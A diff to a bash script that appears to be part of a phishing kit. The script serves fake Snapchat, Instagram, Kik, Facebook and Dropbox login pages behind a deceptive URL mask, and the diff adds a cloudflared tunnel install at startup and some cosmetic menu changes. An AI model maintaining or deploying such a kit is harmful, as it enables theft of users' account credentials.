@@ -22,6 +22,9 @@ else
 	mkdir -p ".server/www"
 fi
 
+if [[ -e ".server/.cld.log" ]]; then
+	rm -rf ".server/.cld.log"
+fi
 
 exit_on_signal_SIGINT() {
     { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
@@ -164,7 +167,7 @@ install_cloudflared() {
 
 msg_exit() {
 	{ clear; banner; echo; }
-	echo -e "${GREENBG}${BLACK} Thank you for using this tool, have a good day.${RESETBG}\n"
+	echo -e "${GREENBG}${BLACK} Thank you for using this tool, have a good day!${RESETBG}\n"
 	{ reset_color; exit 0; }
 }
 
@@ -406,10 +409,13 @@ main_menu() {
 		mask='https://snapchat-login'
 		tunnel_menu
 	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
+		{ clear; banner_small; }
 		site_instagram
 	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
+		{ clear; banner_small; }
 		site_kik
 	elif [[ "$REPLY" == 4 || "$REPLY" == 04 ]]; then
+		{ clear; banner_small; }
 		site_facebook
 	elif [[ "$REPLY" == 5 || "$REPLY" == 05 ]]; then
 		website="dropbox"
@@ -448,4 +454,5 @@ main_menu() {
 
 kill_pid
 dependencies
+install_cloudflared
 main_menu
